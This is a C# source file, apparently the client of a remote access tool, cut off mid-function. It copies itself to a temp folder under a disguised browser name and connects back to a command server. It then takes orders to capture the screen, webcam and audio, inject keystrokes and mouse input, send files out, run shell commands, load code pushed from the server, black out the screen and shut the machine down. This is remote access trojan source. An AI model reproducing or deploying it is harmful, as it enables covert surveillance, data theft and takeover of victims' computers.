using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using RemoteControl.Protocals;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Media;
using System.Drawing.Imaging;
using Newtonsoft.Json;
using Microsoft.VisualBasic.Devices;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Plugin;
using RemoteControl.Protocals.Utilities;
using System.Net;
using RemoteControl.Protocals.Response;
using Microsoft.Win32;

namespace RemoteControl.Client
{
    class Program
    {
        private static Socket oServer;
        private static SocketSession oServerSession;
        private static ClientParameters clientParameters;
        private static bool isTestMode = true;
        private static Dictionary<string, RequestStartGetScreen> sessionScreenHandleSwitch = new Dictionary<string, RequestStartGetScreen>();
        private static Dictionary<string, bool> sessionVideoHandleSwitch = new Dictionary<string, bool>();
        private static Dictionary<string, bool> sessionDownloadHandleSwitch = new Dictionary<string, bool>();
        private static Dictionary<string, Process> sessionCmdHandleSwitch = new Dictionary<string, Process>();
        private static Dictionary<string, RequestLockMouse> sessionLockMouseHandleSwitch = new Dictionary<string, RequestLockMouse>();
        private static readonly string LastVideoCapturePathStoreFile = Environment.GetEnvironmentVariable("temp") + "\\vcpsf.dat";
        private static Dictionary<string, FileStream> fileUploadDic = new Dictionary<string, FileStream>();
        private static string lastVideoCaptureExeFile = null;
        private static string lastMsgBoxExeFile = null;
        private static string lastPlayMusicExeFile = null;
        private static Dictionary<string, List<byte>> codePluginDic = new Dictionary<string, List<byte>>();
        private static bool isClosing = false;
        private static Thread heartbeatThread = null;
        private static Dictionary<ePacketType, IRequestHandler> handlers = new Dictionary<ePacketType, IRequestHandler>();

        static void Main(string[] args)
        {
            // 窗体隐藏时调用Console.Title会报错
            //Console.Title = "RC";
            ReadParameters();
            if (args.Length == 0)
            {
                // 进行安装操作
                string sourceFilePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                var destinationFileDir = Environment.GetEnvironmentVariable("temp") + "\\" + Guid.NewGuid().ToString();
                if (!System.IO.Directory.Exists(destinationFileDir))
                {
                    System.IO.Directory.CreateDirectory(destinationFileDir);
                }
                string serviceName = "360se.exe";
                if (!string.IsNullOrWhiteSpace(clientParameters.ServiceName))
                {
                    serviceName = clientParameters.ServiceName;
                }
                var destinationFilePath = destinationFileDir + "\\" + serviceName;
                System.IO.File.Copy(sourceFilePath, destinationFilePath, true);
                var t = ProcessUtil.Run(destinationFilePath, "/r", true, false);
                t.Join();
                return;
            }
            else if (args.Length == 1 && args[0] == "/r")
            {
                // 进行运行操作
                InitHandlers();
                StartConnect();
                heartbeatThread = new Thread(() => StartHeartbeat()) { IsBackground = true };
                heartbeatThread.Start();
                StartMonitor();
            }
        }

        static void InitHandlers()
        {
            handlers.Add(ePacketType.PACKET_VIEW_REGISTRY_KEY_REQUEST, new RequestViewRegistryKeyHandler());
            handlers.Add(ePacketType.PACKET_OPE_REGISTRY_VALUE_NAME_REQUEST, new RequestOpeRegistryValueNameHandler());
            RequestCaptureAudioHandler captureAudioHandler = new RequestCaptureAudioHandler();
            handlers.Add(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
            handlers.Add(ePacketType.PACKET_STOP_CAPTURE_AUDIO_REQUEST, captureAudioHandler);
        }

        static void ReadParameters()
        {
            if (isTestMode)
            {
                clientParameters.SetServerIP("192.168.0.107");
                clientParameters.ServerPort = 10086;
                clientParameters.OnlineAvatar = "";
                clientParameters.ServiceName = "";
            }
            else
            {
                string filePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                clientParameters = ClientParametersManager.ReadParameters(filePath); 
            }
            Console.WriteLine("参数信息：");
            Console.WriteLine("IP:" + clientParameters.GetServerIP());
            Console.WriteLine("PORT：" + clientParameters.ServerPort);
        }

        static void StartConnect()
        {
            while (true)
            {
                try
                {
                    DoOutput("正在连接服务器...");
                    oServer = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    oServer.Connect(clientParameters.GetIPEndPoint());
                    DoOutput("服务器连接成功！");

                    oServerSession = new SocketSession(oServer.RemoteEndPoint.ToString(), oServer);
                    StartRecvData(oServerSession);
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("连接服务器异常，" + ex.Message);
                }
                Thread.Sleep(3000);
            }
        }

        static void StartRecvData(SocketSession session)
        {
            // 获取主机名，并告诉服务器
            ResponseGetHostName resp = new ResponseGetHostName();
            resp.HostName = Dns.GetHostName();
            resp.AppPath = Application.ExecutablePath;
            resp.OnlineAvatar = clientParameters.OnlineAvatar;
            session.Send(ePacketType.PACKET_GET_HOST_NAME_RESPONSE, resp);

            new Thread(() =>
            {
                byte[] buffer = new byte[1024];
                int recvSize = -1;
                List<byte> data = new List<byte>();
                while (true)
                {
                    try
                    {
                        recvSize = session.SocketObj.Receive(buffer);
                        if (recvSize < 0)
                            continue;

                        for (int i = 0; i < recvSize; i++)
                        {
                            data.Add(buffer[i]);
                        }
                        while (data.Count >= 4)
                        {
                            int packetLength = BitConverter.ToInt32(data.ToArray(), 0);
                            if (data.Count >= packetLength)
                            {
                                DoRecvBytes(session, data.SplitBytes(0, packetLength));
                                data.RemoveRange(0, packetLength);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                        break;
                    }
                }
            }) { IsBackground = true }.Start();
        }

        static void DoRecvBytes(SocketSession session, byte[] packet)
        {
            ePacketType packetType;
            object obj;
            PacketFactory.DecodeObject(packet, out packetType, out obj);
            Console.WriteLine(packetType.ToString());

            string sessionId = session.SocketId;
            if(packetType == ePacketType.PACKET_GET_DRIVES_REQUEST)
            {
                ResponseGetDrives resp = new ResponseGetDrives();
                resp.drives = Environment.GetLogicalDrives().ToList();
                oServer.Send(PacketFactory.EncodeOject(ePacketType.PACKET_GET_DRIVES_RESPONSE, resp));
            }
            else if (packetType == ePacketType.PACKET_GET_SUBFILES_OR_DIRS_REQUEST)
            {
                try
                {
                    RequestGetSubFilesOrDirs req = obj as RequestGetSubFilesOrDirs;
                    ResponseGetSubFilesOrDirs resp = new ResponseGetSubFilesOrDirs();
                    resp.dirs = new List<Protocals.DirectoryProperty>();
                    var dirs = System.IO.Directory.GetDirectories(req.parentDir).ToList();
                    foreach (var item in dirs)
                    {
                        DirectoryInfo di = new DirectoryInfo(item);
                        resp.dirs.Add(new DirectoryProperty()
                        {
                            DirPath = item,
                            CreationTime = di.CreationTime,
                            LastWriteTime = di.LastWriteTime,
                            LastAccessTime = di.LastAccessTime
                        });
                    }

                    resp.files = new List<FileProperty>();
                    var files = System.IO.Directory.GetFiles(req.parentDir).ToList();
                    foreach (var item in files)
                    {
                        FileInfo fi = new FileInfo(item);
                        resp.files.Add(new FileProperty() 
                        {
                            FilePath = item,
                            Size = fi.Length,
                            CreationTime = fi.CreationTime,
                            LastWriteTime = fi.LastWriteTime,
                            LastAccessTime = fi.LastAccessTime
                        });
                    }
                    oServer.Send(PacketFactory.EncodeOject(ePacketType.PACKET_GET_SUBFILES_OR_DIRS_RESPONSE, resp));
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (packetType == ePacketType.PACKET_START_CAPTURE_SCREEN_REQUEST)
            {
                RequestStartGetScreen req = obj as RequestStartGetScreen;
                if (!sessionScreenHandleSwitch.ContainsKey(sessionId))
                {
                    sessionScreenHandleSwitch.Add(sessionId, req);
                    new Thread(() => StartClientCaptureScreen(session)) { IsBackground = true }.Start();
                }
                else
                {
                    sessionScreenHandleSwitch[sessionId].fps = req.fps;
                }
            }
            else if (packetType == ePacketType.PACKET_STOP_CAPTURE_SCREEN_REQUEST)
            {
                if (sessionScreenHandleSwitch.ContainsKey(sessionId))
                {
                    sessionScreenHandleSwitch.Remove(sessionId);
                }
            }
            else if (packetType == ePacketType.PACKET_CREATE_FILE_OR_DIR_REQUEST)
            {
                RequestCreateFileOrDir req = obj as RequestCreateFileOrDir;
                ResponseCreateFileOrDir resp = new ResponseCreateFileOrDir();
                resp.Path = req.Path;
                resp.PathType = req.PathType;
                try
                {
                    if (req.PathType == ePathType.File)
                    {
                        if (!System.IO.File.Exists(req.Path))
                        {
                            System.IO.File.Create(req.Path).Close();
                        }
                    }
                    else
                    {
                        if (!System.IO.Directory.Exists(req.Path))
                        {
                            System.IO.Directory.CreateDirectory(req.Path);
                        }
                    }
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.ToString();
                }
                session.Send(ePacketType.PACKET_CREATE_FILE_OR_DIR_RESPONSE, resp);
            }
            else if (packetType == ePacketType.PACKET_DELETE_FILE_OR_DIR_REQUEST)
            {
                RequestDeleteFileOrDir req = obj as RequestDeleteFileOrDir;
                ResponseDeleteFileOrDir resp = new ResponseDeleteFileOrDir();
                resp.Path = req.Path;
                resp.PathType = req.PathType;
                try
                {
                    if (req.PathType == ePathType.File)
                    {
                        System.IO.File.Delete(req.Path);
                    }
                    else
                    {
                        System.IO.Directory.Delete(req.Path);
                    }
                }
                catch (Exception ex)
                {
                    resp.Result = false;
                    resp.Message = ex.ToString();
                }
                session.Send(ePacketType.PACKET_DELETE_FILE_OR_DIR_RESPONSE, resp);
            }
            else if (packetType == ePacketType.PACKET_START_DOWNLOAD_REQUEST)
            {
                RequestStartDownload req = obj as RequestStartDownload;
                ResponseStartDownloadHeader resp = new ResponseStartDownloadHeader();
                // 获取文件大小
                var fs = System.IO.File.OpenRead(req.Path);
                resp.FileSize = fs.Length;
                resp.Path = req.Path;
                resp.SavePath = req.SavePath;
                fs.Close();
                session.Send(ePacketType.PACKET_START_DOWNLOAD_HEADER_RESPONSE, resp);
                if (sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
                    return;
                sessionDownloadHandleSwitch.Add(session.SocketId, true);
                new Thread(() => StartClientDownload(session, req)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_STOP_DOWNLOAD_REQUEST)
            {
                if (sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionDownloadHandleSwitch.Remove(session.SocketId);
                }
            }
            else if (packetType == ePacketType.PACKET_COMMAND_REQUEST)
            {
                var req = obj as RequestCommand;
                StartClientCmd(session, req);
            }
            else if (packetType == ePacketType.PACKET_SHUTDOWN_REQUEST)
            {
                ProcessUtil.Run("shutdown.exe", "-s -t 0", true);
            }
            else if (packetType == ePacketType.PACKET_REBOOT_REQUEST)
            {
                ProcessUtil.Run("shutdown.exe", "-r -t 0", true);
            }
            else if (packetType == ePacketType.PACKET_SLEEP_REQUEST)
            {
                ProcessUtil.Run("rundll32.exe", "powrprof.dll,SetSuspendState 0,1,0", true);
            }
            else if (packetType == ePacketType.PACKET_HIBERNATE_REQUEST)
            {
                ProcessUtil.Run("rundll32.exe", "powrProf.dll,SetSuspendState", true);
            }
            else if (packetType == ePacketType.PACKET_LOCK_REQUEST)
            {
                ProcessUtil.Run("rundll32.exe", "user32.dll,LockWorkStation", true);
            }
            else if (packetType == ePacketType.PACKET_OPEN_URL_REQUEST)
            {
                var req = obj as RequestOpenUrl;
                ProcessUtil.Run(req.Url, "", false, true);
            }
            else if (packetType == ePacketType.PACKET_MESSAGEBOX_REQUEST)
            {
                var req = obj as RequestMessageBox;
                StartShowMsgBox(session, req);
            }
            else if (packetType == ePacketType.PACKET_LOCK_MOUSE_REQUEST)
            {
                var req = obj as RequestLockMouse;
                if (!sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionLockMouseHandleSwitch.Add(session.SocketId, req);
                    new Thread(() => StartLockMouse(session)) { IsBackground = true }.Start();
                }
                else{
                    sessionLockMouseHandleSwitch[session.SocketId] = req;
                }
            }
            else if (packetType == ePacketType.PACKET_UNLOCK_MOUSE_REQUEST)
            {
                if (sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionLockMouseHandleSwitch.Remove(session.SocketId);
                }
            }
            else if (packetType == ePacketType.PAKCET_BLACK_SCREEN_REQUEST)
            {
                new Thread(() => StartBlackScreen(session)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PAKCET_UN_BLACK_SCREEN_REQUEST)
            {
                new Thread(() => StartUnBlackScreen(session)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_OPEN_CD_REQUEST)
            {
                try
                {
                    Win32API.mciSendString("Set cdaudio door open wait", "", 0, IntPtr.Zero);//打开
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (packetType == ePacketType.PACKET_CLOSE_CD_REQUEST)
            {
                try
                {
                    Win32API.mciSendString("Set cdaudio door Closed wait", "", 0, IntPtr.Zero);//关闭
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
            else if (packetType == ePacketType.PACKET_PLAY_MUSIC_REQUEST)
            {
                var req = obj as RequestPlayMusic;
                StopMusic();
                StartPlayMusic(session, req.MusicFilePath);
            }
            else if (packetType == ePacketType.PACKET_STOP_PLAY_MUSIC_REQUEST)
            {
                StopMusic();
            }
            else if (packetType == ePacketType.PACKET_DOWNLOAD_WEBFILE_REQUEST)
            {
                var req = obj as RequestDownloadWebFile;
                StartDownloadWebFile(session, req);
            }
            else if (packetType == ePacketType.PACKET_GET_PROCESSES_REQUEST)
            {
                new Thread(() => StartGetProcesses(session)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_KILL_PROCESS_REQUEST)
            {
                var req = obj as RequestKillProcesses;
                new Thread(() =>
                    {
                        StartKillProcesses(session, req);
                        StartGetProcesses(session);
                    }) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_START_CAPTURE_VIDEO_REQUEST)
            {
                var req = obj as RequestStartCaptureVideo;
                new Thread(() =>
                    {
                        if (!sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                        {
                            sessionVideoHandleSwitch.Add(session.SocketId, true);
                            // 关闭上次打开的程序
                            Console.WriteLine("当前lastVideoCaptureExeFile：" + lastVideoCaptureExeFile);
                            if (lastVideoCaptureExeFile == null)
                            {
                                if (System.IO.File.Exists(LastVideoCapturePathStoreFile))
                                {
                                    lastVideoCaptureExeFile = System.IO.File.ReadAllText(LastVideoCapturePathStoreFile);
                                    Console.WriteLine("读取到store文件：" + lastVideoCaptureExeFile);
                                }
                            }
                            if (lastVideoCaptureExeFile != null)
                            {
                                string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                                ProcessUtil.KillProcess(processName.ToLower());
                            }
                            // 释放并打开视频程序
                            byte[] data = ResUtil.GetResFileData("CamCapture.dat");
                            string fileName = ResUtil.WriteToRandomFile(data,"camCapture.exe");
                            lastVideoCaptureExeFile = fileName;
                            System.IO.File.WriteAllText(LastVideoCapturePathStoreFile, fileName);
                            //ProcessUtil.Run("cmd.exe", "/c start " + fileName + " /s /fps:2", true, false);
                            ProcessUtil.Run("cmd.exe", "/c start " + fileName + " /fps:" + req.Fps, true, false);
                            // 查找视频程序的端口
                            string pName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                            DoOutput("已启动视频监控程序：" + pName);
                            int port = -1;
                            int tryTimes = 0;
                            while (tryTimes<60)
                            {
                                port = FindServerPortByProcessName(pName);
                                DoOutput("视频端口：" + port);
                                if (port != -1)
                                    break;
                                Thread.Sleep(1000);
                                tryTimes++;
                            }
                            if (port == -1)
                                return;
                            CaptureVideoClient.MessagerReceived += (o, args) =>
                                {
                                    try
                                    {
                                        var p = o as List<byte>;
                                        var resp = new ResponseStartCaptureVideo();
                                        resp.CollectTime = new DateTime(BitConverter.ToInt64(p.ToArray(), 0));
                                        p.RemoveRange(0, 8);
                                        resp.ImageData = p.ToArray();
                                        if (resp.ImageData != null)
                                        {
                                            DoOutput("接收到视频数据" + resp.ImageData.Length);
                                        }

                                        session.Send(ePacketType.PACKET_START_CAPTURE_VIDEO_RESPONSE, resp);
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine("CaptureVideoClient.MessagerReceived，" + ex.Message);
                                    }
                                };
                            try
                            {
                                CaptureVideoClient.Connect("127.0.0.1", port);
                                DoOutput("已经连接上视频服务");
                            }
                            catch (Exception ex)
                            {
                                Console.WriteLine(ex.Message);
                            }
                            // 检测是否已经关闭监控视频，并退出服务，结束视频服务程序
                            while (true)
                            {
                                if (!sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                                {
                                    DoOutput("已关闭视频监控数据传输连接!");
                                    CaptureVideoClient.Close();
                                    if (lastVideoCaptureExeFile != null)
                                    {
                                        string processName = System.IO.Path.GetFileNameWithoutExtension(lastVideoCaptureExeFile);
                                        ProcessUtil.KillProcess(processName.ToLower());
                                    }
                                    break;
                                }
                                Thread.Sleep(1000);
                            }
                        }

                    }) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_STOP_CAPTURE_VIDEO_REQUEST)
            {
                if (sessionVideoHandleSwitch.ContainsKey(session.SocketId))
                {
                    sessionVideoHandleSwitch.Remove(session.SocketId);
                }
            }
            else if (packetType == ePacketType.PACKET_START_UPLOAD_HEADER_REQUEST)
            {
                var req = obj as RequestStartUploadHeader;
                if (fileUploadDic.ContainsKey(req.Id))
                    return;
                FileStream fs = new FileStream(req.To, FileMode.Create, FileAccess.Write);
                fileUploadDic.Add(req.Id, fs);
            }
            else if (packetType == ePacketType.PACKET_START_UPLOAD_RESPONSE)
            {
                var resp = obj as ResponseStartUpload; 
                if (fileUploadDic.ContainsKey(resp.Id))
                {
                    FileStream fs = fileUploadDic[resp.Id];
                    fs.Write(resp.Data, 0, resp.Data.Length);
                }
            }
            else if (packetType == ePacketType.PACKET_STOP_UPLOAD_REQUEST)
            {
                var req = obj as RequestStopUpload;
                if (fileUploadDic.ContainsKey(req.Id))
                {
                    fileUploadDic[req.Id].Close();
                    fileUploadDic[req.Id].Dispose();
                    fileUploadDic.Remove(req.Id);
                }
            }
            else if (packetType == ePacketType.PACKET_COPY_FILE_OR_DIR_REQUEST)
            {
                var req = obj as RequestCopyFile;
                new Thread(() => CopyFile(session, req.SourceFile, req.DestinationFile, false)) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_MOVE_FILE_OR_DIR_REQUEST)
            {
                var req = obj as RequestMoveFile;
                new Thread(() => CopyFile(session, req.SourceFile, req.DestinationFile, true)) { IsBackground = true }.Start();
            }
            else if(packetType == ePacketType.PACKET_RENAME_FILE_REQUEST)
            {
                var req = obj as RequestRenameFile;

                try
                {
                    Computer c = new Computer();
                    c.FileSystem.RenameFile(req.SourceFile, req.DestinationFileName);
                    DoOutput("重命名成功" + req.SourceFile + "=>" + req.DestinationFileName);
                }
                catch (Exception ex)
                {
                    DoOutput("重命名失败" + req.SourceFile + "," + ex.Message);
                }
            }
            else if (packetType == ePacketType.PACKET_QUIT_APP_REQUEST)
            {
                Environment.Exit(0);
            }
            else if (packetType == ePacketType.PACKET_RESTART_APP_REQUEST)
            {
                string path = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
                var thread = ProcessUtil.Run(path, "/r", true);
                thread.Join();
                Environment.Exit(0);
            }
            else if (packetType == ePacketType.PACKET_TRANSPORT_EXEC_CODE_REQUEST)
            {
                var req = obj as RequestTransportExecCode;
                if (!codePluginDic.ContainsKey(req.ID))
                {
                    codePluginDic.Add(req.ID, new List<byte>());
                }
                codePluginDic[req.ID].AddRange(req.Data);
            }
            else if (packetType == ePacketType.PACKET_RUN_EXEC_CODE_REQUEST)
            {
                Console.WriteLine("开始处理请求：" + packetType.ToString());
                new Thread(() => {
                    try
                    {
                        var req = obj as RequestRunExecCode;
                        Console.WriteLine("请求ID:" + req.ID);
                        if (codePluginDic.ContainsKey(req.ID))
                        {
                            Console.WriteLine("请求ID存在:" + req.ID + "开始加载插件...");
                            byte[] data = codePluginDic[req.ID].ToArray();
                            Console.WriteLine("数据长度：" + data.Length);
                            PluginLoader.LoadPlugin(data, OnFireQuit);
                            codePluginDic.Remove(req.ID);
                        }
                        else
                        {
                            Console.WriteLine("请求ID不存在:" + req.ID);
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.Message);
                    }
                }) { IsBackground = true }.Start();
            }
            else if (packetType == ePacketType.PACKET_MOUSE_EVENT_REQUEST)
            {
                var req = obj as RequestMouseEvent;
                DoOutput(string.Format("button:{0},operation:{1},location:{2},{3}",
                    req.MouseButton,
                    req.MouseOperation,
                    req.MouseLocation.X, req.MouseLocation.Y));

                if (req.MouseOperation == eMouseOperations.MouseDown)
                {
                    MouseOpeUtil.MouseDown(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MouseUp)
                {
                    MouseOpeUtil.MouseUp(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MousePress)
                {
                    MouseOpeUtil.MousePress(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MouseDoubleClick)
                {
                    MouseOpeUtil.MouseDoubleClick(req.MouseButton, req.MouseLocation);
                }
                else if (req.MouseOperation == eMouseOperations.MouseMove)
                {
                    MouseOpeUtil.MouseMove(req.MouseLocation);
                }
                else
                {
                    return;
                }
            }
            else if (packetType == ePacketType.PACKET_KEYBOARD_EVENT_REQUEST)
            {
                var req = obj as RequestKeyboardEvent;
                DoOutput(string.Format("keyCode:{0},keyValue:{1},keyOperation:{2}",
                    req.KeyCode, req.KeyValue, req.KeyOperation));
                KeyboardOpeUtil.KeyOpe(req.KeyCode, req.KeyOperation);
            }
            else if (packetType == ePacketType.PACKET_OPEN_FILE_REQUEST)
            {
                var req = obj as RequestOpenFile;
                ProcessUtil.Run(req.FilePath, "", req.IsHide, true);
            }
            else
            {
                if(handlers.ContainsKey(packetType))
                {
                    handlers[packetType].Handle(session, packetType, obj);
                }
            }
        }

        static void CopyFile(SocketSession session, string sourceFile, string destFile, bool isDeleteSourceFile)
        {
            ResponseBase resp = null;
            if (isDeleteSourceFile)
            {
                resp = new ResponseMoveFile() { SourceFile = sourceFile, DestinationFile = destFile };
            }
            else
            {
                resp = new ResponseCopyFile() { SourceFile = sourceFile, DestinationFile = destFile };
            }
            try
            {
                string dir = System.IO.Path.GetDirectoryName(destFile);
                string fileName = System.IO.Path.GetFileNameWithoutExtension(destFile);
                string ext = System.IO.Path.GetExtension(destFile);
                string newDestFile = destFile;
                for (int i = 0; ; i++)
                {
                    if (System.IO.File.Exists(newDestFile))
                    {
                        newDestFile = dir + "\\" + fileName + " - 副本" + (i==0?"" : " (" + i + ")") + ext;
                    }
                    else{
                        break;
                    }
                }
                DoOutput(string.Format("正在将文件{0}{1}到{2}...", sourceFile, isDeleteSourceFile ? "移动" : "复制", newDestFile));
                System.IO.File.Copy(sourceFile, newDestFile);
                if (isDeleteSourceFile)
                {
                    System.IO.File.Delete(sourceFile);
                }
                DoOutput(string.Format("完成将文件{0}{1}到{2}！", sourceFile, isDeleteSourceFile ? "移动" : "复制", newDestFile));
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = (isDeleteSourceFile ? "移动" : "复制") + "失败," + ex.Message;
                resp.Detail = ex.StackTrace;
                DoOutput(ex.Message);
            }
            if (isDeleteSourceFile)
            {
                session.Send(ePacketType.PACKET_MOVE_FILE_OR_DIR_RESPONSE, resp);
            }
            else
            {
                session.Send(ePacketType.PACKET_COPY_FILE_OR_DIR_RESPONSE, resp);
            }
        }

        static int FindServerPortByProcessName(string processName)
        {
            var pros = Process.GetProcesses();
            for (int i = 0; i < pros.Length; i++)
            {
                var p = pros[i];
                if (p.ProcessName.Contains(processName))
                {
                    DoOutput("找到进程:" + p.ProcessName + ",id:" + p.Id);
                    int processId = p.Id;

                    Process pro = new Process();
                    pro.StartInfo.FileName = "cmd.exe";
                    pro.StartInfo.CreateNoWindow = true;
                    pro.StartInfo.UseShellExecute = false;
                    pro.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    pro.StartInfo.RedirectStandardInput = true;
                    pro.StartInfo.RedirectStandardOutput = true;
                    pro.Start();
                    Thread.Sleep(1000);
                    pro.StandardInput.WriteLine("netstat -ano | findstr \"" + processId + "\"");
                    Thread.Sleep(1000);
                    //pro.BeginOutputReadLine();
                    while (pro.StandardOutput.Peek() != -1)
                    {
                        string line = pro.StandardOutput.ReadLine().Trim();
                        DoOutput("行：" + line);
                        if (line.StartsWith("TCP"))
                        {
                            var cols = line.Split("\r\n\t ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
                            if (cols.Length == 5)
                            {
                                if (cols[4] == processId.ToString())
                                {
                                    var ipep = cols[1];
                                    var a = ipep.Split(':');
                                    return Convert.ToInt32(a[1]);
                                }
                            }
                            else if (cols.Length == 4)
                            {
                                if (cols[3] == processId.ToString())
                                {
                                    var ipep = cols[1];
                                    var a = ipep.Split(':');
                                    return Convert.ToInt32(a[1]);
                                }
                            }
                        }
                    }

                    break;
                }

            }

            return -1;
        }

        static void StartKillProcesses(SocketSession session, RequestKillProcesses req)
        {
            var processList = Process.GetProcesses().ToList();
            for (int i = 0; i < req.ProcessIds.Count; i++)
            {
                string processId = req.ProcessIds[i];
                try
                {
                    Process p = processList.Find(m => m.Id.ToString() == processId);
                    if (p == null)
                        continue;

                    p.Kill();
                }
                catch (Exception ex)
                {
                }
            }
        }

        static void StartGetProcesses(SocketSession session)
        {
            ResponseGetProcesses resp = new ResponseGetProcesses();

            try
            {
                var processes = ProcessUtil.GetProcessProperyList();
                resp.Processes = processes.OrderBy(s=>s.ProcessName).ToList();
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.Message;
            }

            session.Send(ePacketType.PACKET_GET_PROCESSES_RESPONSE, resp);
        }

        static void PlayMusic(string path)
        {
            //var aa  = Win32API.PlaySound(path, UIntPtr.Zero,
            //   (uint)(Win32API.SoundFlags.SND_FILENAME | Win32API.SoundFlags.SND_ASYNC | Win32API.SoundFlags.SND_NOSTOP));

            int ret1 = Win32API.mciSendString("open \"" + path + "\" alias mymusic", "", 0, IntPtr.Zero);
            int ret2 = Win32API.mciSendString("play mymusic", "", 0, IntPtr.Zero);
        }

        static void StopMusic()
        {
            if (lastPlayMusicExeFile != null)
            {
                ProcessUtil.KillProcess(lastPlayMusicExeFile);
            }
            //Win32API.mciSendString("close mymusic", null, 0, IntPtr.Zero);//关闭
        }

        static void StartDownloadWebFile(SocketSession session, RequestDownloadWebFile req)
        {
            try
            {
                // 释放程序
                byte[] data = ResUtil.GetResFileData("Downloader.dat");
                string fileName = ResUtil.WriteToRandomFile(data);
                // 启动程序
                string arguments = string.Format("{0} {1}", req.WebFileUrl,req.DestinationPath);
                ProcessUtil.Run("cmd.exe", "/c start " + fileName + " " + arguments, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void StartShowMsgBox(SocketSession session, RequestMessageBox req)
        {
            try
            {
                if (lastMsgBoxExeFile == null || !System.IO.File.Exists(lastMsgBoxExeFile))
                {
                    // 释放弹窗程序
                    byte[] data = ResUtil.GetResFileData("MsgBox.dat");
                    string fileName = ResUtil.WriteToRandomFile(data);
                    lastMsgBoxExeFile = fileName;
                }
                // 启动弹窗程序
                string msgBoxArguments = string.Format("{0} {1} {2} {3}", req.Content,req.Title,req.MessageBoxButtons,req.MessageBoxIcons);
                ProcessUtil.Run("cmd.exe", "/c start " + lastMsgBoxExeFile + " " + msgBoxArguments, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void StartPlayMusic(SocketSession session, string musicFilePath)
        {
            try
            {
                // 释放音乐播放程序
                byte[] data = ResUtil.GetResFileData("MusicPlayer.dat");
                string musicPlayerFileName = ResUtil.WriteToRandomFile(data);
                lastPlayMusicExeFile = System.IO.Path.GetFileNameWithoutExtension(musicPlayerFileName);
                // 启动音乐播放程序
                ProcessUtil.Run("cmd.exe", "/c start " + musicPlayerFileName + " " + musicFilePath, true, false);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void StartBlackScreen(SocketSession session)
        {
            try
            {
                // 释放黑屏程序
                byte[] data = ResUtil.GetResFileData("BlackScreen.dat");
                string blackScreenFileName = ResUtil.WriteToRandomFile(data, "blackscreen.exe");
                // 启动黑屏程序
                ProcessUtil.RunByCmdStart(blackScreenFileName, true);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
        }

        static void StartUnBlackScreen(SocketSession session)
        {
            try
            {
                ProcessUtil.KillProcess("blackscreen");

                Win32API.ShowWindow(Win32API.FindWindow(Win32API.Shell_TrayWnd_Name,null), Win32API.SW_SHOW);
            }
            catch (Exception ex)
            {
                
            }
        }

        static void StartLockMouse(SocketSession session)
        {
            var req = sessionLockMouseHandleSwitch[session.SocketId];
            for (int i = 0; i < req.LockSeconds; i++)
            {
                req = sessionLockMouseHandleSwitch[session.SocketId];
                for (int j = 0; j < 100; j++)
                {
                    MouseOpeUtil.MouseMove(0, 0);
                    Thread.Sleep(10);
                }
                if (!sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
                    return;
            }
            if (sessionLockMouseHandleSwitch.ContainsKey(session.SocketId))
            {
                sessionLockMouseHandleSwitch.Remove(session.SocketId);
            }
        }

        static void StartClientDownload(SocketSession session, RequestStartDownload req)
        {
            FileStream fs = new FileStream(req.Path, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[2048];
            while (true)
            {
                if (!sessionDownloadHandleSwitch.ContainsKey(session.SocketId))
                {
                    Console.WriteLine("文件下载被终止！");
                    break;
                }
                int size = fs.Read(buffer, 0, buffer.Length);
                if (size < 1)
                    break;

                byte[] data = new byte[size];
                for (int i = 0; i < data.Length; i++)
                {
